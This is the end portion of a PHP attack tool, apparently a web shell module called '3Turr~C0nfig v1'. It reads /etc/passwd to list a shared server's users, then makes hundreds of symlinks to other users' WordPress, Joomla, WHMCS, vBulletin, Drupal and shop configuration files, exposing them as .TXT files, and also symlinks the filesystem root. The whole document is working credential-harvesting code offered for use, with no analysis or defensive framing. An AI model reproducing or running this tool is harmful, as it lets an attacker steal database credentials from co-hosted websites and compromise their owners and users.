@symlink('/home/' . $user . '/www/home/configuration.php', $user . '-joomla-home.TXT');
@symlink('/home/' . $user . '/www/vb/includes/config.php', $user . '-vb.TXT');
@symlink('/home/' . $user . '/www/vb3/includes/config.php', $user . '-vb3.TXT');
@symlink('/home/' . $user . '/www/includes/config.php', $user . '-includes-vb.TXT');
@symlink('/home/' . $user . '/www/whm/configuration.php', $user . '-whm15.TXT');
@symlink('/home/' . $user . '/www/central/configuration.php', $user . '-whm-central.TXT');
@symlink('/home/' . $user . '/www/whm/whmcs/configuration.php', $user . '-whm-whmcs.TXT');
@symlink('/home/' . $user . '/www/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.TXT');
@symlink('/home/' . $user . '/www/whmc/WHM/configuration.php', $user . '-whmc-WHM.TXT');
@symlink('/home/' . $user . '/www/whmcs/configuration.php', $user . '-whmcs.TXT');
@symlink('/home/' . $user . '/www/support/configuration.php', $user . '-support.TXT');
@symlink('/home/' . $user . '/www/supp/configuration.php', $user . '-supp.TXT');
@symlink('/home/' . $user . '/www/secure/configuration.php', $user . '-sucure.TXT');
@symlink('/home/' . $user . '/www/secure/whm/configuration.php', $user . '-sucure-whm.TXT');
@symlink('/home/' . $user . '/www/secure/whmcs/configuration.php', $user . '-sucure-whmcs.TXT');
@symlink('/home/' . $user . '/www/cpanel/configuration.php', $user . '-cpanel.TXT');
@symlink('/home/' . $user . '/www/panel/configuration.php', $user . '-panel.TXT');
@symlink('/home/' . $user . '/www/host/configuration.php', $user . '-host.TXT');
@symlink('/home/' . $user . '/www/hosting/configuration.php', $user . '-hosting.TXT');
@symlink('/home/' . $user . '/www/hosts/configuration.php', $user . '-hosts.TXT');
@symlink('/home/' . $user . '/www/configuration.php', $user . '-joomla.TXT');
@symlink('/home/' . $user . '/www/submitticket.php', $user . '-whmcs2.TXT');
@symlink('/home/' . $user . '/www/clients/configuration.php', $user . '-clients.TXT');
@symlink('/home/' . $user . '/www/client/configuration.php', $user . '-client.TXT');
@symlink('/home/' . $user . '/www/clientes/configuration.php', $user . '-clientes.TXT');
@symlink('/home/' . $user . '/www/cliente/configuration.php', $user . '-client.TXT');
@symlink('/home/' . $user . '/www/clientsupport/configuration.php', $user . '-clientsupport.TXT');
@symlink('/home/' . $user . '/www/billing/configuration.php', $user . '-billing.TXT');
@symlink('/home/' . $user . '/www/manage/configuration.php', $user . '-whm-manage.TXT');
@symlink('/home/' . $user . '/www/my/configuration.php', $user . '-whm-my.TXT');
@symlink('/home/' . $user . '/www/myshop/configuration.php', $user . '-whm-myshop.TXT');
@symlink('/home/' . $user . '/www/includes/dist-configure.php', $user . '-zencart.TXT');
@symlink('/home/' . $user . '/www/zencart/includes/dist-configure.php', $user . '-shop-zencart.TXT');
@symlink('/home/' . $user . '/www/shop/includes/dist-configure.php', $user . '-shop-ZCshop.TXT');
@symlink('/home/' . $user . '/www/Settings.php', $user . '-smf.TXT');
@symlink('/home/' . $user . '/www/smf/Settings.php', $user . '-smf2.TXT');
@symlink('/home/' . $user . '/www/forum/Settings.php', $user . '-smf-forum.TXT');
@symlink('/home/' . $user . '/www/forums/Settings.php', $user . '-smf-forums.TXT');
@symlink('/home/' . $user . '/www/upload/includes/config.php', $user . '-up.TXT');
@symlink('/home/' . $user . '/www/up/includes/config.php', $user . '-up2.TXT');
@symlink('/home/' . $user . '/www/includes/configure.php',$user.'-shop.TXT');
@symlink('/home/' . $user . '/www/os/includes/configure.php',$user.'-shop-os.TXT');
@symlink('/home/' . $user . '/www/oscom/includes/configure.php',$user.'-oscom.TXT');
@symlink('/home/' . $user . '/www/oscommerce/includes/configure.php',$user.'-oscommerce.TXT');
@symlink('/home/' . $user . '/www/oscommerces/includes/configure.php',$user.'-oscommerces.TXT');
@symlink('/home/' . $user . '/www/shop/includes/configure.php',$user.'-shop2.TXT');
@symlink('/home/' . $user . '/www/shopping/includes/configure.php',$user.'-shop-shopping.TXT');
@symlink('/home/' . $user . '/www/sale/includes/configure.php',$user.'-sale.TXT');
@symlink('/home/' . $user . '/www/amember/config.TXT.php',$user.'-amember.TXT');
@symlink('/home/' . $user . '/www/config.TXT.php',$user.'-amember2.TXT');
@symlink('/home/' . $user . '/www/members/configuration.php',$user.'-members.TXT');
@symlink('/home/' . $user . '/www/config.php',$user.'-4images1.TXT');
@symlink('/home/' . $user . '/www/forum/includes/config.php',$user.'-forum.TXT');
@symlink('/home/' . $user . '/www/forums/includes/config.php',$user.'-forums.TXT');
@symlink('/home/' . $user . '/www/admin/conf.php',$user.'-5.TXT');
@symlink('/home/' . $user . '/www/admin/config.php',$user.'-4.TXT');
@symlink('/home/' . $user . '/www/wp-config.php',$user.'-wp13.TXT');
@symlink('/home/' . $user . '/www/wp/wp-config.php',$user.'-wp13-wp.TXT');
@symlink('/home/' . $user . '/www/WP/wp-config.php',$user.'-wp13-WP.TXT');
@symlink('/home/' . $user . '/www/wp/beta/wp-config.php',$user.'-wp13-wp-beta.TXT');
@symlink('/home/' . $user . '/www/beta/wp-config.php',$user.'-wp13-beta.TXT');
@symlink('/home/' . $user . '/www/press/wp-config.php',$user.'-wp13-press.TXT');
@symlink('/home/' . $user . '/www/wordpress/wp-config.php',$user.'-wp13-wordpress.TXT');
@symlink('/home/' . $user . '/www/Wordpress/wp-config.php',$user.'-wp13-Wordpress.TXT');
@symlink('/home/' . $user . '/www/blog/wp-config.php',$user.'-wp13-Wordpress.TXT');
@symlink('/home/' . $user . '/www/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.TXT');
@symlink('/home/' . $user . '/www/news/wp-config.php',$user.'-wp13-news.TXT');
@symlink('/home/' . $user . '/www/new/wp-config.php',$user.'-wp13-new.TXT');
@symlink('/home/' . $user . '/www/blog/wp-config.php',$user.'-wp-blog.TXT');
@symlink('/home/' . $user . '/www/beta/wp-config.php',$user.'-wp-beta.TXT');
@symlink('/home/' . $user . '/www/blogs/wp-config.php',$user.'-wp-blogs.TXT');
@symlink('/home/' . $user . '/www/home/wp-config.php',$user.'-wp-home.TXT');
@symlink('/home/' . $user . '/www/protal/wp-config.php',$user.'-wp-protal.TXT');
@symlink('/home/' . $user . '/www/site/wp-config.php',$user.'-wp-site.TXT');
@symlink('/home/' . $user . '/www/main/wp-config.php',$user.'-wp-main.TXT');
@symlink('/home/' . $user . '/www/test/wp-config.php',$user.'-wp-test.TXT');
@symlink('/home/' . $user . '/www/arcade/functions/dbclass.php',$user.'-ibproarcade.TXT');
@symlink('/home/' . $user . '/www/joomla/configuration.php',$user.'-joomla2.TXT');
@symlink('/home/' . $user . '/www/protal/configuration.php',$user.'-joomla-protal.TXT');
@symlink('/home/' . $user . '/www/joo/configuration.php',$user.'-joo.TXT');
@symlink('/home/' . $user . '/www/cms/configuration.php',$user.'-joomla-cms.TXT');
@symlink('/home/' . $user . '/www/site/configuration.php',$user.'-joomla-site.TXT');
@symlink('/home/' . $user . '/www/main/configuration.php',$user.'-joomla-main.TXT');
@symlink('/home/' . $user . '/www/news/configuration.php',$user.'-joomla-news.TXT');
@symlink('/home/' . $user . '/www/new/configuration.php',$user.'-joomla-new.TXT');
@symlink('/home/' . $user . '/www/home/configuration.php',$user.'-joomla-home.TXT');
@symlink('/home/' . $user . '/www/vb/includes/config.php',$user.'-vb-config.TXT');
@symlink('/home/' . $user . '/www/vb3/includes/config.php',$user.'-vb3-config.TXT');
@symlink('/home/' . $user . '/www/cc/includes/config.php',$user.'-vb1-config.TXT');
@symlink('/home/' . $user . '/www/includes/config.php',$user.'-includes-vb.TXT');
@symlink('/home/' . $user . '/www/forum/includes/class_core.php',$user.'-vbluttin-class_core.php.TXT');
@symlink('/home/' . $user . '/www/vb/includes/class_core.php',$user.'-vbluttin-class_core.php1.TXT');
@symlink('/home/' . $user . '/www/cc/includes/class_core.php',$user.'-vbluttin-class_core.php2.TXT');
@symlink('/home/' . $user . '/www/whm/configuration.php',$user.'-whm15.TXT');
@symlink('/home/' . $user . '/www/central/configuration.php',$user.'-whm-central.TXT');
@symlink('/home/' . $user . '/www/whm/whmcs/configuration.php',$user.'-whm-whmcs.TXT');
@symlink('/home/' . $user . '/www/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.TXT');
@symlink('/home/' . $user . '/www/whmc/WHM/configuration.php',$user.'-whmc-WHM.TXT');
@symlink('/home/' . $user . '/www/whmcs/configuration.php',$user.'-whmcs.TXT');
@symlink('/home/' . $user . '/www/support/configuration.php',$user.'-support.TXT');
@symlink('/home/' . $user . '/www/supp/configuration.php',$user.'-supp.TXT');
@symlink('/home/' . $user . '/www/secure/configuration.php',$user.'-sucure.TXT');
@symlink('/home/' . $user . '/www/secure/whm/configuration.php',$user.'-sucure-whm.TXT');
@symlink('/home/' . $user . '/www/secure/whmcs/configuration.php',$user.'-sucure-whmcs.TXT');
@symlink('/home/' . $user . '/www/cpanel/configuration.php',$user.'-cpanel.TXT');
@symlink('/home/' . $user . '/www/panel/configuration.php',$user.'-panel.TXT');
@symlink('/home/' . $user . '/www/host/configuration.php',$user.'-host.TXT');
@symlink('/home/' . $user . '/www/hosting/configuration.php',$user.'-hosting.TXT');
@symlink('/home/' . $user . '/www/hosts/configuration.php',$user.'-hosts.TXT');
@symlink('/home/' . $user . '/www/configuration.php',$user.'-joomla.TXT');
@symlink('/home/' . $user . '/www/submitticket.php',$user.'-whmcs2.TXT');
@symlink('/home/' . $user . '/www/clients/configuration.php',$user.'-clients.TXT');
@symlink('/home/' . $user . '/www/client/configuration.php',$user.'-client.TXT');
@symlink('/home/' . $user . '/www/clientes/configuration.php',$user.'-clientes.TXT');
@symlink('/home/' . $user . '/www/cliente/configuration.php',$user.'-client.TXT');
@symlink('/home/' . $user . '/www/clientsupport/configuration.php',$user.'-clientsupport.TXT');
@symlink('/home/' . $user . '/www/billing/configuration.php',$user.'-billing.TXT');
@symlink('/home/' . $user . '/www/manage/configuration.php',$user.'-whm-manage.TXT');
@symlink('/home/' . $user . '/www/my/configuration.php',$user.'-whm-my.TXT');
@symlink('/home/' . $user . '/www/myshop/configuration.php',$user.'-whm-myshop.TXT');
@symlink('/home/' . $user . '/www/includes/dist-configure.php',$user.'-zencart.TXT');
@symlink('/home/' . $user . '/www/zencart/includes/dist-configure.php',$user.'-shop-zencart.TXT');
@symlink('/home/' . $user . '/www/shop/includes/dist-configure.php',$user.'-shop-ZCshop.TXT');
@symlink('/home/' . $user . '/www/Settings.php',$user.'-smf.TXT');
@symlink('/home/' . $user . '/www/smf/Settings.php',$user.'-smf2.TXT');
@symlink('/home/' . $user . '/www/forum/Settings.php',$user.'-smf-forum.TXT');
@symlink('/home/' . $user . '/www/forums/Settings.php',$user.'-smf-forums.TXT');
@symlink('/home/' . $user . '/www/upload/includes/config.php',$user.'-up.TXT');
@symlink('/home/' . $user . '/www/article/config.php',$user.'-Nwahy.TXT');
@symlink('/home/' . $user . '/www/up/includes/config.php',$user.'-up2.TXT');
@symlink('/home/' . $user . '/www/conf_global.php',$user.'-6.TXT');
@symlink('/home/' . $user . '/www/include/db.php',$user.'-7.TXT');
@symlink('/home/' . $user . '/www/connect.php',$user.'-PHP-Fusion.TXT');
@symlink('/home/' . $user . '/www/mk_conf.php',$user.'-9.TXT');
@symlink('/home/' . $user . '/www/includes/config.php',$user.'-traidnt1.TXT');
@symlink('/home/' . $user . '/www/config.php',$user.'-4images.TXT');
@symlink('/home/' . $user . '/www/sites/default/settings.php',$user.'-Drupal.TXT');
@symlink('/home/' . $user . '/www/member/configuration.php',$user.'-1member.TXT') ;
@symlink('/home/' . $user . '/www/billings/configuration.php',$user.'-billings.TXT') ;
@symlink('/home/' . $user . '/www/whm/configuration.php',$user.'-whm.TXT');
@symlink('/home/' . $user . '/www/supports/configuration.php',$user.'-supports.TXT');
@symlink('/home/' . $user . '/www/requires/config.php',$user.'-AM4SS-hosting.TXT');
@symlink('/home/' . $user . '/www/supports/includes/iso4217.php',$user.'-hostbills-supports.TXT');
@symlink('/home/' . $user . '/www/client/includes/iso4217.php',$user.'-hostbills-client.TXT');
@symlink('/home/' . $user . '/www/support/includes/iso4217.php',$user.'-hostbills-support.TXT');
@symlink('/home/' . $user . '/www/billing/includes/iso4217.php',$user.'-hostbills-billing.TXT');
@symlink('/home/' . $user . '/www/billings/includes/iso4217.php',$user.'-hostbills-billings.TXT');
@symlink('/home/' . $user . '/www/host/includes/iso4217.php',$user.'-hostbills-host.TXT');
@symlink('/home/' . $user . '/www/hosts/includes/iso4217.php',$user.'-hostbills-hosts.TXT');
@symlink('/home/' . $user . '/www/hosting/includes/iso4217.php',$user.'-hostbills-hosting.TXT');
@symlink('/home/' . $user . '/www/hostings/includes/iso4217.php',$user.'-hostbills-hostings.TXT');
@symlink('/home/' . $user . '/www/includes/iso4217.php',$user.'-hostbills.TXT');
@symlink('/home/' . $user . '/www/hostbills/includes/iso4217.php',$user.'-hostbills-hostbills.TXT');
@symlink('/home/' . $user . '/www/hostbill/includes/iso4217.php',$user.'-hostbills-hostbill.TXT');
@symlink('/home/' . $user . '/www/config.php', $user . '-4images1.TXT');
@symlink('/home/' . $user . '/www/blog/wp-config.php', $user . '-wp13-Wordpress.TXT');
@symlink('/home/' . $user . '/www/arcade/functions/dbclass.php', $user . '-ibproarcade.TXT');
@symlink('/home/' . $user . '/www/vb/includes/config.php', $user . '-vb-config.TXT');
@symlink('/home/' . $user . '/www/vb3/includes/config.php', $user . '-vb3-config.TXT');
@symlink('/home/' . $user . '/www/cc/includes/config.php', $user . '-vb1-config.TXT');
@symlink('/home/' . $user . '/www/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.TXT');
@symlink('/home/' . $user . '/www/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.TXT');
@symlink('/home/' . $user . '/www/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.TXT');
@symlink('/home/' . $user . '/www/article/config.php', $user . '-Nwahy.TXT');
@symlink('/home/' . $user . '/www/connect.php', $user . '-PHP-Fusion.TXT');
@symlink('/home/' . $user . '/www/includes/config.php', $user . '-traidnt1.TXT');
@symlink('/home/' . $user . '/www/config.php', $user . '-4images.TXT');
@symlink('/home/' . $user . '/www/sites/default/settings.php', $user . '-Drupal.TXT');
@symlink('/home/' . $user . '/www/member/configuration.php', $user . '-1member.TXT');
@symlink('/home/' . $user . '/www/supports/includes/iso4217.php', $user . '-hostbills-supports.TXT');
@symlink('/home/' . $user . '/www/client/includes/iso4217.php', $user . '-hostbills-client.TXT');
@symlink('/home/' . $user . '/www/support/includes/iso4217.php', $user . '-hostbills-support.TXT');
@symlink('/home/' . $user . '/www/billing/includes/iso4217.php', $user . '-hostbills-billing.TXT');
@symlink('/home/' . $user . '/www/billings/includes/iso4217.php', $user . '-hostbills-billings.TXT');
@symlink('/home/' . $user . '/www/host/includes/iso4217.php', $user . '-hostbills-host.TXT');
@symlink('/home/' . $user . '/www/hosts/includes/iso4217.php', $user . '-hostbills-hosts.TXT');
@symlink('/home/' . $user . '/www/hosting/includes/iso4217.php', $user . '-hostbills-hosting.TXT');
@symlink('/home/' . $user . '/www/hostings/includes/iso4217.php', $user . '-hostbills-hostings.TXT');
@symlink('/home/' . $user . '/www/includes/iso4217.php', $user . '-hostbills.TXT');
@symlink('/home/' . $user . '/www/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.TXT');
@symlink('/home/' . $user . '/www/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.TXT');
@symlink('/home/' . $user . '/www/cart/configuration.php', $user . '-cart-WHMCS.TXT');
@symlink('/home/' . $user . '/www/hosting/configuration.php', $user . '-hosting-WHMCS.TXT');
@symlink('/home/' . $user . '/www/buy/configuration.php', $user . '-buy-WHMCS.TXT');
@symlink('/home/' . $user . '/www/checkout/configuration.php', $user . '-checkout-WHMCS.TXT');
@symlink('/home/' . $user . '/www/host/configuration.php', $user . '-host-WHMCS.TXT');
@symlink('/home/' . $user . '/www/shop/configuration.php', $user . '-shop-WHMCS.TXT');
@symlink('/home/' . $user . '/www/shopping/configuration.php', $user . '-shopping-WHMCS.TXT');
@symlink('/home/' . $user . '/www/sale/configuration.php', $user . '-sale-WHMCS.TXT');
@symlink('/home/' . $user . '/www/client/configuration.php', $user . '-client-WHMCS.TXT');
@symlink('/home/' . $user . '/www/support/configuration.php', $user . '-support-WHMCS.TXT');
@symlink('/home/' . $user . '/www/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.TXT');
@symlink('/home/' . $user . '/www/whmcs/configuration.php', $user . '-whmc-WHMCS.TXT');
@symlink('/home/' . $user . '/www/supp/configuration.php', $user . '-supp-WHMCS.TXT');
@symlink('/home/' . $user . '/www/secure/configuration.php', $user . '-sucure-WHMCS.TXT');
@symlink('/home/' . $user . '/www/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.TXT');
@symlink('/home/' . $user . '/www/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.TXT');
@symlink('/home/' . $user . '/www/panel/configuration.php', $user . '-panel-WHMCS.TXT');
@symlink('/home/' . $user . '/www/hosts/configuration.php', $user . '-hosts-WHMCS.TXT');
@symlink('/home/' . $user . '/www/submitticket.php', $user . '-submitticket-WHMCS.TXT');
@symlink('/home/' . $user . '/www/clients/configuration.php', $user . '-clients-WHMCS.TXT');
@symlink('/home/' . $user . '/www/clientes/configuration.php', $user . '-clientes-WHMCS.TXT');
@symlink('/home/' . $user . '/www/cliente/configuration.php', $user . '-client-WHMCS.TXT');
@symlink('/home/' . $user . '/www/billing/configuration.php', $user . '-billing-WHMCS.TXT');
@symlink('/home/' . $user . '/www/manage/configuration.php', $user . '-whm-manage-WHMCS.TXT');
@symlink('/home/' . $user . '/www/my/configuration.php', $user . '-whm-my-WHMCS.TXT');
@symlink('/home/' . $user . '/www/myshop/configuration.php', $user . '-whm-myshop-WHMCS.TXT');
@symlink('/home/' . $user . '/www/billings/configuration.php', $user . '-billings-WHMCS.TXT');
@symlink('/home/' . $user . '/www/supports/configuration.php', $user . '-supports-WHMCS.TXT');
@symlink('/home/' . $user . '/www/auto/configuration.php', $user . '-auto-WHMCS.TXT');
@symlink('/home/' . $user . '/www/go/configuration.php', $user . '-go-WHMCS.TXT');
@symlink('/home/' . $user . '/www/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.TXT');
@symlink('/home/' . $user . '/www/bill/configuration.php', $user . '-bill-WHMCS.TXT');
@symlink('/home/' . $user . '/www/payment/configuration.php', $user . '-payment-WHMCS.TXT');
@symlink('/home/' . $user . '/www/pay/configuration.php', $user . '-pay-WHMCS.TXT');
@symlink('/home/' . $user . '/www/purchase/configuration.php', $user . '-purchase-WHMCS.TXT');
@symlink('/home/' . $user . '/www/clientarea/configuration.php', $user . '-clientarea-WHMCS.TXT');
@symlink('/home/' . $user . '/www/autobuy/configuration.php', $user . '-autobuy-WHMCS.TXT');


@symlink('/', 'Turr/root');
        }
        echo "<br><br><a href='Turr/root' target=\"_blank\" >./root</a><br>
<br>
<a href='Turr' target=\"_blank\" >./c0nfig's</a><br><br><a href='https://www.facebook.com/ahmed.f.alarbi' target=\"_blank\">3Turr</a>";
    } else {
        echo '
		
    <font style="font-family: Courier ;font-size:32px;" >3Turr~C0nfig v1</font><br>
    <span><font color="red">Use:</font> Insert the users list from => <font color="red"> /etc/passwd</font></span><br />
	
		<form method="POST">
<textarea name="passwd" id="checkouttextarea" style="margin: 5px;padding:5px;border:2px dotted red; width: 543px; height: 420px; background-color:#0C0C0C; font-family:Courier; font-size:8pt; color:red">';
        flush();
        $file = '/etc/passwd';
        $read = @fopen($file, 'r');
        if ($read) {
            $body = @fread($read, @filesize($file));
            echo "" . htmlentities($body) . "";
        } elseif (!$read) {
            $read = @show_source($file);
        } elseif (!$read) {
            $read = @highlight_file($file);
        } elseif (!$read) {
            for ($uid = 0;$uid < 3000;$uid++) {
                $ara = posix_getpwuid($uid);
                if (!empty($ara)) {
                    while (list($key, $val) = each($ara)) {
                        print "$val:";
                    }
                    echo "\r\n";
                }
            }
        }
        flush();
        echo '</textarea></br>
<p>&nbsp;</p>
<input name="m" size="80" value="C0nFig~iT" type="submit" style="border:1px dotted red; width: 99; font-family:Tahoma; font-size:10pt; color:red; text-transform:uppercase; height:23; background-color:#000000"/></br>
</form>';
    }
    echo '</body></html>';
}
?>

